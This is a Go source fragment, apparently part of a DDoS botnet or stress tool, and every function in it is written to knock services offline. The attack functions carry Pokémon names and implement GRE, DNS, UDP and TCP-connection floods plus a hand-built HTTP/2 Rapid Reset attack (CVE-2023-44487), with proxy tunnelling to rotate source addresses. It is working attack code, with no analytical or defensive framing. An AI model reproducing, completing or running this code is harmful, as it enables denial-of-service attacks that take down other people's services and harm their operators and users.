// Uses raw IP sockets with protocol 47 (GRE).
// Parameters:
//   - targetIP: Target IP address or hostname
//   - duration: Attack duration in seconds
//
// Returns: error if target resolution fails
func metagross(targetIP string, duration int) error {

	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("metagross", func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					greHeader := []byte{0, 0, 0, 0} // GRE: flags=0, protocol=0
					payload := make([]byte, 65535-24)
					rand.Read(payload)
					conn.WriteTo(append(greHeader, payload...), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		})
	}
	wg.Wait()
	return nil
}

// encodeDNSName encodes a domain name in DNS wire format (label-length encoding).

// salamence performs a DNS query flood attack.
func salamence(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	domains := dnsFloodDomains
	queryTypes := []uint16{1, 28, 15, 2} // A, AAAA, MX, NS
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("salamence", func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					pkt := encodeDNSQuery(domain, queryType, true)
					conn.WriteTo(pkt, &net.UDPAddr{IP: dstIP, Port: targetPort})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		})
	}
	wg.Wait()
}

// snorlax performs a UDP flood attack.
// Opens multiple UDP connections and sends fixed-size payloads.
// Simpler than raw socket attacks but effective against UDP services.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target UDP port
//   - duration: Attack duration in seconds
func snorlax(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	payload := make([]byte, 1024)
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("snorlax", func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write(payload)
					conn.Close()
				}
			}
		})
	}
	wg.Wait()
}

// gengar performs a TCP connection flood attack.
// Opens TCP connections and sends minimal HTTP-like data.
// Targets connection table exhaustion on the victim.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
func gengar(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("gengar", func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write([]byte(tcpPayload))
					conn.Close()
				}
			}
		})
	}
	wg.Wait()
}

// randUA is now defined above with the uaPool templates

// darkrai performs HTTP/2 Rapid Reset flood (CVE-2023-44487).
// Spawns workerPool concurrent workers sending HEADERS+RST_STREAM pairs.
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
func arkrai(target string, targetPort, duration int) {
	darkraiProxy(target, targetPort, duration, false)
}

// darkraiProxy performs HTTP/2 Rapid Reset with optional proxy support.
// Each worker opens a TLS connection negotiating h2, then sends batches of
// HEADERS frames immediately followed by RST_STREAM (cancel).
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy CONNECT tunneling from loaded proxy list
func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	if idx := strings.Index(hostname, ":"); idx != -1 {
		hostname = hostname[:idx]
	}

	targetURL := fmt.Sprintf("https://%s:%d/", hostname, targetPort)

	if useProxy {
		proxyListMutex.RLock()
		pLen := len(proxyList)
		proxyListMutex.RUnlock()
		if pLen == 0 {
			return
		}
	}

	var wg sync.WaitGroup
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("darkrai", func() {
			defer wg.Done()
			// Each worker reconnects in a loop until duration expires
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
				}
				// Merge stop channel and context into single channel for giratina
				merged := make(chan struct{})
				go func() {
					select {
					case <-ctx.Done():
						close(merged)
					case <-stopCh:
						close(merged)
					}
				}()
				giratina(targetURL, merged)
				// Small backoff before reconnecting to avoid tight spin on failures
				time.Sleep(50 * time.Millisecond)
			}
		})
	}
	wg.Wait()
}

// giratina opens a single HTTP/2 TLS connection and continuously sends
// ============================================================================
// Raw HTTP/2 framing — no external dependencies.
// Implements just enough of RFC 7540 + RFC 7541 (HPACK) for rapid reset:
// client preface, SETTINGS, HEADERS (static table only), RST_STREAM.
// ============================================================================

const h2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

// h2Frame types and flags
const (
	h2FrameData     = 0x0
	h2FrameHeaders  = 0x1
	h2FrameRST      = 0x3
	h2FrameSettings = 0x4
	h2FrameGoAway   = 0x7

	h2FlagEndStream  = 0x1
	h2FlagEndHeaders = 0x4
	h2FlagSettingsAck = 0x1

	h2ErrCancel = uint32(8)
)

// h2WriteFrame writes a single HTTP/2 frame to w.
func h2WriteFrame(w *bufio.Writer, frameType, flags byte, streamID uint32, payload []byte) error {
	l := len(payload)
	hdr := [9]byte{
		byte(l >> 16), byte(l >> 8), byte(l),
		frameType,
		flags,
		byte(streamID>>24) & 0x7f, byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
	}
	if _, err := w.Write(hdr[:]); err != nil {
		return err
	}
	_, err := w.Write(payload)
	return err
}

// h2WriteSettings writes a SETTINGS frame with two entries:
// MAX_CONCURRENT_STREAMS=1000, INITIAL_WINDOW_SIZE=65535.
func h2WriteSettings(w *bufio.Writer) error {
	payload := make([]byte, 12)
	// MAX_CONCURRENT_STREAMS (0x3) = 1000
	binary.BigEndian.PutUint16(payload[0:], 0x3)
	binary.BigEndian.PutUint32(payload[2:], 1000)
	// INITIAL_WINDOW_SIZE (0x4) = 65535
	binary.BigEndian.PutUint16(payload[6:], 0x4)
	binary.BigEndian.PutUint32(payload[8:], 65535)
	return h2WriteFrame(w, h2FrameSettings, 0, 0, payload)
}

// h2WriteSettingsAck sends a SETTINGS ACK.
func h2WriteSettingsAck(w *bufio.Writer) error {
	return h2WriteFrame(w, h2FrameSettings, h2FlagSettingsAck, 0, nil)
}

// h2WriteRST writes a RST_STREAM frame with the given error code.
func h2WriteRST(w *bufio.Writer, streamID, errCode uint32) error {
	var payload [4]byte
	binary.BigEndian.PutUint32(payload[:], errCode)
	return h2WriteFrame(w, h2FrameRST, 0, streamID, payload[:])
}

// hpackBlock builds a minimal HPACK header block using RFC 7541 static table.
//
// Static table entries used:
//   index 2 → :method: GET        (0x82 = indexed representation)
//   index 4 → :path: /            (0x84 = indexed representation)
//   index 7 → :scheme: https      (0x87 = indexed representation)
//   index 1 → :authority (name)   (0x01 = literal without indexing, indexed name)
//
// For non-root paths: literal without indexing, indexed name :path (index 4).
// RFC 7541 §6.2.2: literal without indexing, indexed name → 0b0000_xxxx
//   where xxxx is the 4-bit index (fits for indices 1-14).
func hpackBlock(authority, path string) []byte {
	var b bytes.Buffer

	// :method: GET — static index 2
	b.WriteByte(0x82)

	// :path
	if path == "/" || path == "" {
		// static index 4 → :path: /
		b.WriteByte(0x84)
	} else {
		// literal without indexing, indexed name, index=4
		b.WriteByte(0x04)
		b.WriteByte(byte(len(path)))
		b.WriteString(path)
	}

	// :scheme: https — static index 7
	b.WriteByte(0x87)

	// :authority — literal without indexing, indexed name, index=1
	b.WriteByte(0x01)
	b.WriteByte(byte(len(authority)))
	b.WriteString(authority)

	return b.Bytes()
}

// h2WriteHeaders writes a HEADERS frame with END_STREAM and END_HEADERS set.
func h2WriteHeaders(w *bufio.Writer, streamID uint32, hpack []byte) error {
	return h2WriteFrame(w, h2FrameHeaders, h2FlagEndStream|h2FlagEndHeaders, streamID, hpack)
}

// h2ReadFrame reads one HTTP/2 frame header and discards the payload.
// Returns frame type, flags, stream ID, and any error.
func h2ReadFrame(r io.Reader) (frameType, flags byte, streamID uint32, err error) {
	var hdr [9]byte
	if _, err = io.ReadFull(r, hdr[:]); err != nil {
		return
	}
	length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
	frameType = hdr[3]
	flags = hdr[4]
	streamID = binary.BigEndian.Uint32(hdr[5:]) & 0x7fffffff
	if length > 0 {
		_, err = io.ReadFull(r, make([]byte, length))
	}
	return
}

// giratina sends HEADERS+RST_STREAM pairs (CVE-2023-44487 rapid reset).
// Pure stdlib — no external HTTP/2 package required.
// Supports proxy CONNECT tunnels for IP rotation.
func giratina(targetURL string, stop <-chan struct{}) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return err
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		port = "443"
	}
	addr := net.JoinHostPort(host, port)

	// Dial — through proxy CONNECT tunnel or direct
	var rawConn net.Conn
	proxy := persian()
	if proxy != "" {
		pURL, err := url.Parse(proxy)
		if err != nil {
			return err
		}
		rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return err
		}
		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
		}
		connectReq += "\r\n"
		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return err
		}
		resp, err := http.ReadResponse(bufio.NewReader(rawConn), nil)
		if err != nil {
			rawConn.Close()
			return fmt.Errorf("CONNECT failed: %w", err)
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
		}
	} else {
		rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			return err
		}
	}

	// TLS with ALPN h2
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{alpnH2},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()

	if tlsConn.ConnectionState().NegotiatedProtocol != alpnH2 {
		return fmt.Errorf("h2 not negotiated")
	}

	bw := bufio.NewWriterSize(tlsConn, 65536)

	// Client connection preface
	if _, err := bw.WriteString(h2ClientPreface); err != nil {
		return err
	}
	if err := h2WriteSettings(bw); err != nil {
		return err
	}
	bw.Flush()

	// Background reader — ACK server SETTINGS, detect GOAWAY
	connDone := make(chan struct{})
	guardedGo("giratina-reader", func() {
		defer close(connDone)
		for {
			ft, fl, _, err := h2ReadFrame(tlsConn)
			if err != nil {
				return
			}
			if ft == h2FrameSettings && fl&h2FlagSettingsAck == 0 {
				h2WriteSettingsAck(bw)
				bw.Flush()
			}
			if ft == h2FrameGoAway {
				return
			}
		}
	})

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	authority := u.Host
	hdrs := hpackBlock(authority, path)

	var streamID uint32 = 1
	const batchSize = 100

	for {
		select {
		case <-stop:
			return nil
		case <-connDone:
			return fmt.Errorf("connection closed by server")
		default:
		}

		for i := 0; i < batchSize; i++ {
			if err := h2WriteHeaders(bw, streamID, hdrs); err != nil {
				return err
			}
			if err := h2WriteRST(bw, streamID, h2ErrCancel); err != nil {
				return err
			}
			streamID += 2
			if streamID >= 1<<31-1 {
				bw.Flush()
				return nil
			}
		}
		bw.Flush()
	}
}
